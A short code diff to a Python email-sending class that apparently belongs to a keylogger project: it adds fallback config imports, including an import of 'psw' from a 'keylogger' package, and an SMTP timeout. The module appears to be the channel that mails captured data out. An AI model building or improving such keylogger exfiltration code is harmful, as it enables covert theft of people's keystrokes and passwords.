@@ -4,9 +4,14 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-from .config import DEBUG,SMTP_SERVER,SMTP_PORT,USERNAME,PASSWORD
-if DEBUG:
-    from keylogger import psw
+try:
+    from .config import DEBUG,SMTP_SERVER,SMTP_PORT,USERNAME,PASSWORD
+    if DEBUG:
+        from keylogger import psw
+except ImportError:
+    from config import DEBUG,SMTP_SERVER,SMTP_PORT,USERNAME,PASSWORD
+    if DEBUG:
+        import psw
 
 class SendEmail:
     def __init__(self) -> None:
@@ -40,7 +45,7 @@ class SendEmail:
         context = ssl.create_default_context()
         # Send email
         try:
-            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT,timeout=15) as server:
                 server.ehlo()  # Can be omitted
                 server.starttls(context=context)
                 server.ehlo()  # Can be omitted
